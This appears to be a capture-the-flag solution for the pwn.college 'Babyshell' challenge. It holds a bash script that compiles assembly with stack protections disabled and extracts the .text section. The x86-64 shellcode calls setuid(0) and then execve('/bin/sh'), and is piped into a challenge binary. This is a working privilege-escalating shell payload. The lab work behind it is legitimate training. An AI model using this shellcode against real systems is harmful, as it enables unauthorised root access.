# Pwn college Babyshell

```py
  1 #!/bin/bash                                                                             
  2 # script for generating solution
  3 # defining I/O files
  4 file="a.s"
  5 sol="sol.txt"
  6 out="a.out"
  7     
  8 # colored terminal
  9 RED="\033[0;31m"
 10 NC="\033[0m" 
 11 GREEN="\033[0;32m"
 12 YELLOW="\033[1;33m"
 13     
 14 echo -e "compiling assembly from ${RED}${file}${NC}"
 15 gcc -z execstack -fno-stack-protector -nostdlib -static -o $out $file
 16 echo -e "copying text section binary to ${RED}${sol}"
 17 objcopy --dump-section .text=$sol $out
 18  
 19 echo -e "${GREEN}#### DONE! ####"
```


# 1
```s
  1 .intel_syntax noprefix                                                                  
  2 .global _start
  3 .section .text
  4 _start:
  5     mov rax,105
  6     xor rdi,rdi
  7     syscall
  8  
  9     mov rax,59
 10     lea rdi, [rip+binsh]
 11     xor rsi,rsi
 12     xor rdx,rdx
 13     syscall
 14  
 15 binsh:
 16     .string "/bin/sh"
 17  
```
    cat sol.txt - | /challenge/...